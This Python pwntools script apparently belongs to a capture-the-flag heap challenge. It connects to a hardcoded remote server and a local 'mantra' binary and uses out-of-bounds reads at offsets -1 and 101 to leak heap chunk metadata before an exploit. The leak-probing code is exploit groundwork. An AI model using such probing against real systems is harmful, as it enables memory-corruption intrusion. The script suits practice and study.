#!/usr/bin/env python3
"""
Simple remote server test - check if server is up and behavior
"""
from pwn import *
import time
import sys

context.log_level = 'info'

REMOTE_HOST = '154.57.164.75'
REMOTE_PORT = 30444

def test_remote():
    """Test remote server connectivity and behavior"""
    log.info("Testing remote server...")

    try:
        # Connect with timeout
        io = remote(REMOTE_HOST, REMOTE_PORT, timeout=10)
        log.success("Connected to remote server!")

        # Get banner
        banner = io.recvuntil(b'> ')
        log.info(f"Banner received ({len(banner)} bytes)")

        # Weave cord
        io.sendline(b'1')
        io.recvuntil(b'string: ')
        io.sendline(b'100')
        io.recvuntil(b'> ')
        log.success("Cord woven on remote")

        # Tie beads
        io.sendline(b'2')
        io.recvuntil(b'tie? ')
        io.sendline(b'3')
        for i in range(3):
            io.recvuntil(b'glyphs): ')
            io.sendline(b'TESTTEST')

        io.recvuntil(b'> ')
        log.success("Beads tied on remote")

        # Read at offset -1 (chunk metadata)
        io.sendline(b'4')
        io.recvuntil(b'recite? ')
        io.sendline(b'-1')
        io.recvuntil(b'speaks: [')
        data_neg1 = io.recvuntil(b']', drop=True)
        log.success(f"Remote offset -1: {data_neg1.hex()}")

        io.recvuntil(b'> ')

        # Read at offset 101 (top chunk)
        io.sendline(b'4')
        io.recvuntil(b'recite? ')
        io.sendline(b'101')
        io.recvuntil(b'speaks: [')
        data_101 = io.recvuntil(b']', drop=True)
        log.success(f"Remote offset 101: {data_101.hex()}")

        io.recvuntil(b'> ')

        # Try retie bead
        io.sendline(b'3')
        io.recvuntil(b'retie? ')
        io.sendline(b'0')
        io.recvuntil(b'glyphs): ')
        io.sendline(b'RETIEDXX')

        io.recvuntil(b'> ')
        log.success("Retie successful")

        io.close()
        log.success("Remote test completed successfully")

        return True, (data_neg1, data_101)

    except Exception as e:
        log.error(f"Remote test failed: {e}")
        import traceback
        traceback.print_exc()
        return False, None

def compare_with_local(remote_data):
    """Compare remote behavior with local"""
    log.info("Testing local binary for comparison...")

    try:
        io = process(['./glibc/ld-2.34.so', './mantra'])

        # Same sequence
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', b'100')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'3')
        for i in range(3):
            io.sendlineafter(b'glyphs): ', b'TESTTEST')

        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'-1')
        io.recvuntil(b'speaks: [')
        local_neg1 = io.recvuntil(b']', drop=True)

        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'101')
        io.recvuntil(b'speaks: [')
        local_101 = io.recvuntil(b']', drop=True)

        io.close()

        log.success(f"Local offset -1:  {local_neg1.hex()}")
        log.success(f"Remote offset -1: {remote_data[0].hex()}")
        log.success(f"Local offset 101:  {local_101.hex()}")
        log.success(f"Remote offset 101: {remote_data[1].hex()}")

        if local_neg1 == remote_data[0] and local_101 == remote_data[1]:
            log.success("✓ No differences detected - behavior matches")
            return True
        else:
            log.warning("✗ Differences detected!")
            return False

    except Exception as e:
        log.error(f"Local test failed: {e}")
        return False

def main():
    log.info("=" * 60)
    log.info("REMOTE vs LOCAL COMPARISON TEST")
    log.info("=" * 60)

    success, remote_data = test_remote()

    if success:
        compare_with_local(remote_data)
        log.success("\nComparison complete!")
    else:
        log.error("Remote server unreachable")

if __name__ == '__main__':
    main()
